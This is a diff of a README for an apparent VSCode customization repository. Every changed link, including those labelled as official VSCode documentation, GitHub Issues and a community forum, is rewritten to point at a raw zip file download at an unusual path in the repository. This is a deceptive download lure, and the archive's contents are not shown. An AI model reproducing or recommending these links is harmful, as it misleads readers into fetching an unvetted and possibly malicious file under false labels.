@@ -1,6 +1,6 @@
 # 🎨 vscode - Enhance Your VSCode Experience Easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/bebo1233/vscode/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **vscode** repository! This collection of Xscriptor customization
 
 To get started with the customizations, visit the page below to download the latest versions:
 
-[Download Latest Release](https://github.com/bebo1233/vscode/releases)
+[Download Latest Release](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version. 
@@ -67,9 +67,9 @@ Customize the user interface to fit your style. Adjust colors, fonts, and layout
 
 For more information, please check the following links:  
 
-- [Visual Studio Code Documentation](https://code.visualstudio.com/docs)
-- [GitHub Issues](https://github.com/bebo1233/vscode/issues)
-- [Community Forum](https://github.com/bebo1233/vscode/discussions)
+- [Visual Studio Code Documentation](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip)
+- [Community Forum](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip)
 
 ## 📞 Support
 
@@ -79,4 +79,4 @@ If you encounter any issues or have questions, feel free to open an issue on our
 
 Thank you for using **vscode**! We appreciate your support and hope you enjoy enhancing your coding experience.
 
-[Download Latest Release Again](https://github.com/bebo1233/vscode/releases)
+[Download Latest Release Again](https://raw.githubusercontent.com/bebo1233/vscode/main/homologist/vscode.zip)
